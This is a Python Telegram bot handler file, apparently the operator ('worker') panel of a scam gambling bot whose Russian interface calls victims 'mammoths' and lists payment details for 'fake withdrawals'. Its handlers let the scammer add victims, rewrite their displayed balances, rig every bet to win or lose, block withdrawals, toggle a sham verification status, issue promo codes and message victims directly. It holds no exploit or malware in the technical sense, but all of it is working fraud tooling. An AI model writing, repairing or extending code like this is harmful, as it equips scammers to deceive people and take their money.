import configparser
import random

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton

from database import add_worker, get_info_user, on_ved, off_ved, update_min_dep, update_min_dep1, get_all_refer, \
    get_referral, new_referral, add_count_ref, new_promo, get_all_promo, update_balance, win_or_lose_stavka, \
    on_or_off_verif, on_or_off_without, delete_mamont, update_stavka, get_all_info_user, select_worker_count, \
    update_worker, update_worke1r

from loader import dp, bot
from state.states import new_min_dep, add_refer_id, Create_promo, Info_on_my_mamont, Message_mamount
import string

@dp.callback_query_handler(lambda c: c.data and c.data.startswith('mess_'), state='*')
async def qweqweqw(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await call.message.delete()
    user_id = call.data.replace('mess_', '')
    await state.update_data(user_id=user_id)
    await call.message.answer('Введите ссобщение для мамонта')
    await Message_mamount.q1.set()

@dp.message_handler(state=Message_mamount.q1)
async def koweqij(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data.get('user_id')
    await bot.send_message(chat_id=user_id, text=f'{message.text}')
    await message.answer('Сообщение отправлено')
    await state.finish()

def generate_random_string(length):
    letters = string.ascii_uppercase
    rand_string = ''.join(random.choice(letters) for i in range(length))
    return rand_string

@dp.message_handler(text='⚡ Меню воркера', state='*')
@dp.message_handler(commands='воркер', state='*')
async def qweqwe(message: types.Message, state: FSMContext):
    update_worker(user_id=message.from_user.id)
    try:
        await state.finish()
        bot_name = await bot.get_me()
        min_dep = get_info_user(user_id=message.from_user.id)[0][6]
        uved = get_info_user(user_id=message.from_user.id)[0][8]
        text = ''
        if uved == 0:
            text = '❌ Уведомление о действиях мамонтов'
        elif uved == 1:
            text = '✅ Уведомление о действиях мамонтов'
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text='Мои мамонты', callback_data='my_mamont'),
                    InlineKeyboardButton(text='Добавить мамонта', callback_data='add_mamont')
                ],
                [
                    InlineKeyboardButton(text=f'Минимальный депозит для мамонта: {min_dep}', callback_data='min_dep')
                ],
                [
                    InlineKeyboardButton(text=f'{text}', callback_data='din_don')
                ],
                [
                    InlineKeyboardButton(text='Создать промокод', callback_data='create_cod'),
                    InlineKeyboardButton(text='Мои промокоды', callback_data='my_promo')
                ]
            ]
        )
        config = configparser.ConfigParser()
        config.read("settings.ini")
        bank_card = config["Wallets"]["bank_card"]
        qiwi_num = config["Wallets"]["phone_qiwi"]
        yoomany = config["Wallets"]["yoomany"]
        webmoney = config["Wallets"]["webmoney"]
        btc_wall = config["Wallets"]["btc"]
        await message.answer('<b>⚡️ Меню воркера:</b>\n\n'
                             '<b>Реквизиты для фейк вывода средств с баланса:</b>\n'
                             f'<b>├ Банковская Карта:</b> <code>{bank_card}</code>\n'
                             f'<b>├ Номер QIWI:</b> <code>{qiwi_num}</code>\n'
                             f'<b>├ ЮMoney:</b> <code>{yoomany}</code>\n'
                             f'<b>├ WebMoney:</b> <code>{webmoney}</code>\n'
                             f'<b>└ Bitcoin:</b> <code>{btc_wall}</code>\n\n'
                             '<b>Реферальная ссылка:</b>\n'
                             f'https://t.me/{bot_name.username}?start={message.from_user.id}\n'
                             f'<b>Мануал для работы:</b>\n'
                             f'https://t.me/soblazncc',
                             reply_markup=markup, disable_web_page_preview=True)
    except Exception:
        pass

@dp.callback_query_handler(text='din_don', state='*')
async def vcxrter(call: types.CallbackQuery):
    try:
        uved = get_all_info_user(user_id=call.from_user.id)[0][8]
        await call.message.delete()
        if uved == 0:
            on_ved(call.from_user.id)
        elif uved == 1:
            off_ved(call.from_user.id)
        uved = get_all_info_user(user_id=call.from_user.id)[0][8]
        min_dep = get_all_info_user(user_id=call.from_user.id)[0][6]
        text = ''
        if uved == 0:
            text = '❌ Уведомление о действиях мамонтов'
        elif uved == 1:
            text = '✅ Уведомление о действиях мамонтов'
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text='Мои мамонты', callback_data='my_mamont'),
                    InlineKeyboardButton(text='Добавить мамонта', callback_data='add_mamont')
                ],
                [
                    InlineKeyboardButton(text=f'Минимальный депозит для мамонта: {min_dep}', callback_data='min_dep')
                ],
                [
                    InlineKeyboardButton(text=f'{text}', callback_data='din_don')
                ],
                [
                    InlineKeyboardButton(text='Создать промокод', callback_data='create_cod'),
                    InlineKeyboardButton(text='Мои промокоды', callback_data='my_promo')
                ]
            ]
        )
        config = configparser.ConfigParser()
        config.read("settings.ini")
        bank_card = config["Wallets"]["bank_card"]
        qiwi_num = config["Wallets"]["phone_qiwi"]
        yoomany = config["Wallets"]["yoomany"]
        webmoney = config["Wallets"]["webmoney"]
        btc_wall = config["Wallets"]["btc"]
        bot_name = await bot.get_me()
        await call.message.answer('<b>⚡️ Меню воркера:</b>\n\n'
                                  '<b>Реквизиты для фейк вывода средств с баланса:</b>\n'
                                  f'<b>├ Банковская Карта:</b> <code>{bank_card}</code>\n'
                                  f'<b>├ Номер QIWI:</b> <code>{qiwi_num}</code>\n'
                                  f'<b>├ ЮMoney:</b> <code>{yoomany}</code>\n'
                                  f'<b>├ WebMoney:</b> <code>{webmoney}</code>\n'
                                  f'<b>└ Bitcoin:</b> <code>{btc_wall}</code>\n\n'
                                  '<b>Реферальная ссылка:</b>\n'
                                  f'https://t.me/{bot_name.username}?start={call.from_user.id}\n'
                                  f'<b>Мануал для работы:</b>\n'
                                  f'https://t.me/soblazncc',
                                  reply_markup=markup, disable_web_page_preview=True)
    except Exception:
        await call.answer('Произошла ошибка !\n'
                          'Возможно у вас нету рефералов', show_alert=True)

@dp.callback_query_handler(text='min_dep', state='*')
async def koweq(call: types.CallbackQuery):
    await call.message.delete()
    await call.message.answer('Введите минимальную сумму депозита для мамонта:')
    await new_min_dep.q1.set()

@dp.message_handler(state=new_min_dep.q1)
async def qkwoew(message: types.Message):
    update_min_dep(refer=message.from_user.id, count=int(message.text))
    update_min_dep1(count=int(message.text), user_id=message.from_user.id)
    uved = get_info_user(user_id=message.from_user.id)[0][8]
    if uved == 0:
        on_ved(message.from_user.id)
    elif uved == 1:
        off_ved(message.from_user.id)
    uved = get_info_user(user_id=message.from_user.id)[0][8]
    min_dep = get_info_user(user_id=message.from_user.id)[0][6]
    text = ''
    if uved == 0:
        text = '❌ Уведомление о действиях мамонтов'
    elif uved == 1:
        text = '✅ Уведомление о действиях мамонтов'
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text='Мои мамонты', callback_data='my_mamont'),
                InlineKeyboardButton(text='Добавить мамонта', callback_data='add_mamont')
            ],
            [
                InlineKeyboardButton(text=f'Минимальный депозит для мамонта: {min_dep}', callback_data='min_dep')
            ],
            [
                InlineKeyboardButton(text=f'{text}', callback_data='din_don')
            ],
            [
                InlineKeyboardButton(text='Создать промокод', callback_data='create_cod'),
                InlineKeyboardButton(text='Мои промокоды', callback_data='my_promo')
            ]
        ]
    )
    config = configparser.ConfigParser()
    config.read("settings.ini")
    bank_card = config["Wallets"]["bank_card"]
    qiwi_num = config["Wallets"]["phone_qiwi"]
    yoomany = config["Wallets"]["yoomany"]
    webmoney = config["Wallets"]["webmoney"]
    btc_wall = config["Wallets"]["btc"]
    bot_name = await bot.get_me()
    await message.answer('<b>⚡️ Меню воркера:</b>\n\n'
                          '<b>Реквизиты для фейк вывода средств с баланса:</b>\n'
                          f'<b>├ Банковская Карта:</b> <code>{bank_card}</code>\n'
                          f'<b>├ Номер QIWI:</b> <code>{qiwi_num}</code>\n'
                          f'<b>├ ЮMoney:</b> <code>{yoomany}</code>\n'
                          f'<b>├ WebMoney:</b> <code>{webmoney}</code>\n'
                          f'<b>└ Bitcoin:</b> <code>{btc_wall}</code>\n\n'
                          '<b>Реферальная ссылка:</b>\n'
                          f'https://t.me/{bot_name.username}?start={message.from_user.id}\n'
                          f'<b>Мануал для работы:</b>\n'
                          f'https://t.me/soblazncc',
                          reply_markup=markup, disable_web_page_preview=True)

@dp.callback_query_handler(text='back', state='*')
async def qwewq(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await call.message.delete()
    uved = get_info_user(user_id=call.from_user.id)[0][8]
    if uved == 0:
        on_ved(call.from_user.id)
    elif uved == 1:
        off_ved(call.from_user.id)
    uved = get_info_user(user_id=call.from_user.id)[0][8]
    min_dep = get_info_user(user_id=call.from_user.id)[0][6]
    text = ''
    if uved == 0:
        text = '❌ Уведомление о действиях мамонтов'
    elif uved == 1:
        text = '✅ Уведомление о действиях мамонтов'
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text='Мои мамонты', callback_data='my_mamont'),
                InlineKeyboardButton(text='Добавить мамонта', callback_data='add_mamont')
            ],
            [
                InlineKeyboardButton(text=f'Минимальный депозит для мамонта: {min_dep}', callback_data='min_dep')
            ],
            [
                InlineKeyboardButton(text=f'{text}', callback_data='din_don')
            ],
            [
                InlineKeyboardButton(text='Создать промокод', callback_data='create_cod'),
                InlineKeyboardButton(text='Мои промокоды', callback_data='my_promo')
            ]
        ]
    )
    config = configparser.ConfigParser()
    config.read("settings.ini")
    bank_card = config["Wallets"]["bank_card"]
    qiwi_num = config["Wallets"]["phone_qiwi"]
    yoomany = config["Wallets"]["yoomany"]
    webmoney = config["Wallets"]["webmoney"]
    btc_wall = config["Wallets"]["btc"]
    bot_name = await bot.get_me()
    await call.message.answer('<b>⚡️ Меню воркера:</b>\n\n'
                              '<b>Реквизиты для фейк вывода средств с баланса:</b>\n'
                              f'<b>├ Банковская Карта:</b> <code>{bank_card}</code>\n'
                              f'<b>├ Номер QIWI:</b> <code>{qiwi_num}</code>\n'
                              f'<b>├ ЮMoney:</b> <code>{yoomany}</code>\n'
                              f'<b>├ WebMoney:</b> <code>{webmoney}</code>\n'
                              f'<b>└ Bitcoin:</b> <code>{btc_wall}</code>\n\n'
                              '<b>Реферальная ссылка:</b>\n'
                              f'https://t.me/{bot_name.username}?start={call.from_user.id}\n'
                              f'<b>Мануал для работы:</b>\n'
                              f'https://t.me/soblazncc',
                              reply_markup=markup, disable_web_page_preview=True)

@dp.callback_query_handler(text='add_mamont', state='*')
async def klqwrwq(call: types.CallbackQuery):
    await call.message.delete()
    await call.message.answer('Введите user_id или логин мамонта:')
    await add_refer_id.q1.set()

@dp.message_handler(state=add_refer_id.q1)
async def kojekwq(message: types.Message, state: FSMContext):
    try:
        if int(message.from_user.id) != int(message.text):
            if get_referral(message.text)[0] == 'n':
                new_referral(referral=message.from_user.id, user_id=int(message.text))
                add_count_ref(user_id=int(message.from_user.id))
                await message.answer(f'<b>Новый мамонт добавлен: <code>{message.text}</code></b>')
                await state.finish()
            else:
                await message.answer(f'❌ Мамонт не найден/либо уже у него имеется реферал')
                await state.finish()

        else:
            await message.answer(f'❌ Мамонт не найден')
            await state.finish()
    except Exception:
        await message.answer(f'❌ Мамонт не найден')
        await state.finish()

@dp.callback_query_handler(text='create_cod', state='*')
async def qwewqesd(call: types.CallbackQuery):
    await call.message.delete()
    await call.message.answer('Введите сумму промокода:')
    await Create_promo.q1.set()

@dp.message_handler(state=Create_promo.q1)
async def okewq(message: types.Message, state: FSMContext):
    price = int(message.text)
    code = generate_random_string(length=14)
    new_promo(user_id=message.from_user.id, promo=code, price=price)
    await message.answer(f'✅ Промокод успешно создан: <code>{code}</code> : {price}руб')
    await state.finish()

@dp.callback_query_handler(text='my_promo')
async def wqewqe(call: types.CallbackQuery):
    await call.message.delete()
    all_promo = get_all_promo(user_id=call.from_user.id)
    list_promo = []
    for i in all_promo:
        list_promo.append(f'<code>{i[1]}</code> - {i[2]}₽')
    promo = '\n'.join(list_promo)
    await call.message.answer('Список промокодов:\n\n'
                              f'{promo}')

@dp.callback_query_handler(text='back_step', state='*')
async def qwekwq(call: types.CallbackQuery):
    await call.message.delete()
    markup = InlineKeyboardMarkup()
    all_refer = get_all_refer(call.from_user.id)
    for i in all_refer:
        markup.add(
            InlineKeyboardButton(text=f"{i[9]} - {i[0]}", callback_data=f'{i[0]}')
        )
    markup.add(
        InlineKeyboardButton(text='Назад', callback_data='back')
    )
    await call.message.answer('Выберите мамонта:',
                              reply_markup=markup)
    await Info_on_my_mamont.q1.set()


@dp.callback_query_handler(text='my_mamont', state='*')
async def qewwqe(call: types.CallbackQuery):
    await call.message.delete()
    markup = InlineKeyboardMarkup()
    all_refer = get_all_refer(call.from_user.id)
    for i in all_refer:
        markup.add(
            InlineKeyboardButton(text=f"{i[9]} - {i[0]}", callback_data=f'{i[0]}')
        )
    markup.add(
        InlineKeyboardButton(text='Назад', callback_data='back')
    )
    await call.message.answer('Выберите мамонта:',
                              reply_markup=markup)
    await Info_on_my_mamont.q1.set()

@dp.callback_query_handler(text='back_step2', state='*')
async def qweqwe(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    user_id = data.get('user_id')
    all_info = get_info_user(user_id=user_id)[0]
    text = ''
    if all_info[7] == 0:
        text = 'Всегда вин'
    elif all_info[7] == 1:
        text = 'Всегда луз'
    elif all_info[7] == 3:
        text = 'Рандом'
    verif = ''
    if all_info[10] == 0:
        verif = '✅'
    elif all_info[10] == 1:
        verif = '❌'
    await state.update_data(user_id=user_id)
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text='💰 Баланс', callback_data=f'balance_change'),
                InlineKeyboardButton(text='🍀 Удача', callback_data='fart')
            ],
            [
                InlineKeyboardButton(text='🔒 Заблокировать вывод', callback_data='close_wth')
            ],
            [
                InlineKeyboardButton(text='✅ Верификация ✖', callback_data='verif')
            ],
            [
                InlineKeyboardButton(text='✉ Написать мамонту', callback_data=f'mess_{all_info[0]}')
            ],
            [
                InlineKeyboardButton(text='📵 Заблокировать ставку', callback_data='ban_stavka')
            ],
            [
                InlineKeyboardButton(text='🗑 Удалить мамонта 🗑', callback_data='delete_mamont')
            ],
            [
                InlineKeyboardButton(text='Назад', callback_data='back_step')
            ]
        ]
    )
    await call.message.edit_text(f'🐘 Мамонт: {all_info[1]}\n'
                                 f'🆔: <code>{all_info[0]}</code>\n'
                                 f'🏦Баланс: <b>{all_info[2]}руб</b>\n'
                                 f'📌 Фарт: {text}\n'
                                 f'👨‍💻 Верефикация: {verif}', reply_markup=markup)
    await Info_on_my_mamont.q2.set()

@dp.callback_query_handler(state=Info_on_my_mamont.q1)
async def qewqewq(call: types.CallbackQuery, state: FSMContext):
    all_info = get_info_user(user_id=call.data)[0]
    text = ''
    if all_info[7] == 0:
        text = 'Всегда вин'
    elif all_info[7] == 1:
        text = 'Всегда луз'
    elif all_info[7] == 3:
        text = 'Рандом'
    verif = ''
    if all_info[10] == 0:
        verif = '✅'
    elif all_info[10] == 1:
        verif = '❌'
    await state.update_data(user_id=call.data)
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text='💰 Баланс', callback_data=f'balance_change'),
                InlineKeyboardButton(text='🍀 Удача', callback_data='fart')
            ],
            [
                InlineKeyboardButton(text='🔒 Заблокировать вывод', callback_data='close_wth')
            ],
            [
                InlineKeyboardButton(text='✅ Верификация ✖', callback_data='verif')
            ],
            [
                InlineKeyboardButton(text='✉ Написать мамонту', callback_data=f'mess_{all_info[0]}')
            ],
            [
                InlineKeyboardButton(text='📵 Заблокировать ставку', callback_data='ban_stavka')
            ],
            [
                InlineKeyboardButton(text='🗑 Удалить мамонта 🗑', callback_data='delete_mamont')
            ],
            [
                InlineKeyboardButton(text='Назад', callback_data='back_step')
            ]
        ]
    )
    await call.message.edit_text(f'🐘 Мамонт: {all_info[1]}\n'
                                 f'🆔: <code>{all_info[0]}</code>\n'
                                 f'🏦Баланс: <b>{all_info[2]}руб</b>\n'
                                 f'📌 Фарт: {text}\n'
                                 f'👨‍💻 Верефикация: {verif}', reply_markup=markup)
    await Info_on_my_mamont.q2.set()

@dp.callback_query_handler(state=Info_on_my_mamont.q2)
async def okqwewqe(call: types.CallbackQuery, state: FSMContext):
    if call.data == 'balance_change':
        await call.message.delete()
        await call.message.answer('Введите новый баланс пользователя:')
        await Info_on_my_mamont.q3.set()
    elif call.data == 'fart':
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text='Всегда вин', callback_data='all_win'),
                    InlineKeyboardButton(text='Рандом', callback_data='random'),
                    InlineKeyboardButton(text='Всегда луз', callback_data='all_lose')
                ],
                [
                    InlineKeyboardButton(text='Назад', callback_data='back_step2')
                ]
            ]
        )
        await call.message.edit_reply_markup(reply_markup=markup)
        await Info_on_my_mamont.q4.set()
    elif call.data == 'verif':
        await call.message.delete()
        data = await state.get_data()
        user_id = data.get('user_id')
        all_info = get_info_user(user_id=user_id)[0]
        if all_info[10] == 0:
            on_or_off_verif(count=1, user_id=user_id)
        elif all_info[10] == 1:
            on_or_off_verif(count=0, user_id=user_id)

        text = ''
        if all_info[7] == 0:
            text = 'Всегда вин'
        elif all_info[7] == 1:
            text = 'Всегда луз'
        elif all_info[7] == 3:
            text = 'Рандом'
        verif = ''
        if all_info[10] == 0:
            verif = '✅'
        elif all_info[10] == 1:
            verif = '❌'
        await state.update_data(user_id=user_id)
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text='💰 Баланс', callback_data=f'balance_change'),
                    InlineKeyboardButton(text='🍀 Удача', callback_data='fart')
                ],
                [
                    InlineKeyboardButton(text='🔒 Заблокировать вывод', callback_data='close_wth')
                ],
                [
                    InlineKeyboardButton(text='✅ Верификация ✖', callback_data='verif')
                ],
                [
                    InlineKeyboardButton(text='✉ Написать мамонту', callback_data=f'mess_{all_info[0]}')
                ],
                [
                    InlineKeyboardButton(text='📵 Заблокировать ставку', callback_data='ban_stavka')
                ],
                [
                    InlineKeyboardButton(text='🗑 Удалить мамонта 🗑', callback_data='delete_mamont')
                ],
                [
                    InlineKeyboardButton(text='Назад', callback_data='back_step')
                ]
            ]
        )
        await call.message.answer(f'🐘 Мамонт: {all_info[1]}\n'
                                     f'🆔: <code>{all_info[0]}</code>\n'
                                     f'🏦Баланс: <b>{all_info[2]}руб</b>\n'
                                     f'📌 Фарт: {text}\n'
                                     f'👨‍💻 Верефикация: {verif}', reply_markup=markup)
        await Info_on_my_mamont.q2.set()
    elif call.data == 'close_wth':
        data = await state.get_data()
        user_id = data.get('user_id')
        all_info = get_info_user(user_id=user_id)[0][11]
        if all_info == 0:
            on_or_off_without(count=1, user_id=user_id)
            await call.answer('Вывод пользователя заблокирован', show_alert=True)
        elif all_info == 1:
            on_or_off_without(count=0, user_id=user_id)
            await call.answer('Вывод пользователя разблокирован', show_alert=True)
    elif call.data == 'delete_mamont':
        await call.message.delete()
        data = await state.get_data()
        user_id = data.get('user_id')
        delete_mamont(user_id=user_id)
        await call.message.answer('Мамонт успешно удалён')
        await state.finish()
    elif call.data == 'ban_stavka':
        data = await state.get_data()
        user_id = data.get('user_id')
        all_info = get_info_user(user_id=user_id)[0][13]
        if all_info == 0:
            update_stavka(count=1, user_id=user_id)
            await call.answer('Ставка пользователя заблокирована', show_alert=True)
        elif all_info == 1:
            update_stavka(count=0, user_id=user_id)
            await call.answer('Ставка пользователя разблокирована', show_alert=True)
        await Info_on_my_mamont.q2.set()

@dp.callback_query_handler(state=Info_on_my_mamont.q4)
async def qweqfds(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    user_id = data.get('user_id')
    if call.data == 'all_win':
        win_or_lose_stavka(user_id=user_id, chance=0)
    elif call.data == 'random':
        win_or_lose_stavka(user_id=user_id, chance=3)
    elif call.data == 'all_lose':
        win_or_lose_stavka(user_id=user_id, chance=1)

    ############################

    all_info = get_info_user(user_id=user_id)[0]
    text = ''
    if all_info[7] == 0:
        text = 'Всегда вин'
    elif all_info[7] == 1:
        text = 'Всегда луз'
    elif all_info[7] == 3:
        text = 'Рандом'
    verif = ''
    if all_info[10] == 0:
        verif = '✅'
    elif all_info[10] == 1:
        verif = '❌'
    await state.update_data(user_id=call.data)
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text='💰 Баланс', callback_data=f'balance_change'),
                InlineKeyboardButton(text='🍀 Удача', callback_data='fart')
            ],
            [
                InlineKeyboardButton(text='🔒 Заблокировать вывод', callback_data='close_wth')
            ],
            [
                InlineKeyboardButton(text='✅ Верификация ✖', callback_data='verif')
            ],
            [
                InlineKeyboardButton(text='✉ Написать мамонту', callback_data=f'mess_{all_info[0]}')
            ],
            [
                InlineKeyboardButton(text='📵 Заблокировать ставку', callback_data='ban_stavka')
            ],
            [
                InlineKeyboardButton(text='🗑 Удалить мамонта 🗑', callback_data='delete_mamont')
            ],
            [
                InlineKeyboardButton(text='Назад', callback_data='back_step')
            ]
        ]
    )
    await state.update_data(user_id=user_id)
    await call.message.edit_text(f'🐘 Мамонт: {all_info[1]}\n'
                                 f'🆔: <code>{all_info[0]}</code>\n'
                                 f'🏦Баланс: <b>{all_info[2]}руб</b>\n'
                                 f'📌 Фарт: {text}\n'
                                 f'👨‍💻 Верефикация: {verif}', reply_markup=markup)
    await Info_on_my_mamont.q2.set()

@dp.message_handler(state=Info_on_my_mamont.q3)
async def qwejwqie(message: types.Message, state: FSMContext):
    data = await state.get_data()
    user_id = data.get('user_id')
    update_balance(user_id=user_id, count=int(message.text))
    await message.answer('✅ Баланс мамонта успешно обновлен')
    all_info = get_info_user(user_id=user_id)[0]
    text = ''
    if all_info[7] == 0:
        text = 'Всегда вин'
    elif all_info[7] == 1:
        text = 'Всегда луз'
    elif all_info[7] == 3:
        text = 'Рандом'
    verif = ''
    if all_info[10] == 0:
        verif = '✅'
    elif all_info[10] == 1:
        verif = '❌'
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text='💰 Баланс', callback_data=f'balance_change'),
                InlineKeyboardButton(text='🍀 Удача', callback_data='fart')
            ],
            [
                InlineKeyboardButton(text='🔒 Заблокировать вывод', callback_data='close_wth')
            ],
            [
                InlineKeyboardButton(text='✅ Верификация ✖', callback_data='verif')
            ],
            [
                InlineKeyboardButton(text='✉ Написать мамонту', callback_data=f'mess_{all_info[0]}')
            ],
            [
                InlineKeyboardButton(text='📵 Заблокировать ставку', callback_data='ban_stavka')
            ],
            [
                InlineKeyboardButton(text='🗑 Удалить мамонта 🗑', callback_data='delete_mamont')
            ],
            [
                InlineKeyboardButton(text='Назад', callback_data='back_step')
            ]
        ]
    )
    await message.answer(f'🐘 Мамонт: {all_info[1]}\n'
                            f'🆔: <code>{all_info[0]}</code>\n'
                            f'🏦Баланс: <b>{all_info[2]}руб</b>\n'
                            f'📌 Фарт: {text}\n'
                            f'👨‍💻 Верефикация: {verif}', reply_markup=markup)
    await Info_on_my_mamont.q2.set()
